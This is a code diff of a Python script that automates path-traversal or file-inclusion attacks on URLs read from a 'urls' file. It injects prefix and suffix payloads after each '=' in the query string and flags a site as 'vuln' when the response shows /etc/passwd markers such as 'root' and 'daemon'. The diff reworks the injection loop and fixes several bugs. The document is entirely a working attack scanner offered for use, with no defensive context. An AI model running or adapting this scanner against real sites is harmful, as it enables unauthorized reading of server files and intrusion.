@@ -1,14 +1,16 @@
 import re
+from urllib.parse import urlsplit
 import requests
 import time
-
+import os
 def main():
 
     # Inputs
     # -----------------------------------------------
 
-    f = open("prefixes", "r") # filename of Prefix
+    f = open(f"{os.path.dirname(__file__)}/prefixes.txt", "r") # filename of Prefix
     prefixes = re.split("\n", str(f.read()))
+    del prefixes[-1]
     f.close()
 
     f = open("urls", "r") # filename of targets
@@ -26,36 +28,27 @@ def main():
         # for every prefix
         for prefix in prefixes:
             # for every suffix
-            for suffix in suffix:
+            for suffix in suffixes:
 
                 payload = prefix + suffix # declare payload
-                
-                search = re.search("=", target) # True if "=" else False
-                num = re.findall("=", target) # number of "=" in target
-                
-                if search: # if "="
-                    url = target # copy var
-                    url[search.start():search.end()] = "=" + payload # replace "=" with "=" + payload
-                    try:
-                        res = requests.get(url) # request
-                        time.sleep(delay) # delay
-                        # if content in ["daemon" or "root" or "bin"]
-                        if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
-                            print(url) # vuln                
-                    except: pass
+                query = "=" # declare query
+                r = re.compile(query) # compile
+                position = [[m.start(),m.end()] for m in r.finditer(target)] # find all positions of "=" in {target}
 
-                    for n in num: # for number of "=" in target
-                        search = re.search("=", target[search.end():]) # search for "=" in range (number of "=" in target)
-                        if search: # if "="
-                            url = target # copy var
-                            url[search.start():search.end()] = "=" + payload # replace "=" with "=" + payload
-                            try:
-                                res = requests.get(url) # request
-                                time.sleep(delay) # delay
-                                # if content in ["daemon" or "root" or "bin"]
-                                if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
-                                    print(url) # vuln                
-                            except: pass
+                for i, j in position: # for number of "=" in target
+                    if i == [] or j == []:
+                        break
+                    else:
+                        url = list(target) # copy var
+                        url[j:] = payload # replace "=" with "=" + payload
+                        url = ''.join(url)
+                        try:
+                            res = requests.get(url) # request
+                            time.sleep(delay) # delay
+                            # if content in ["daemon" or "root" or "bin"]
+                            if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
+                                print(url) # vuln                
+                        except: pass
 
 # Run Function
 main()
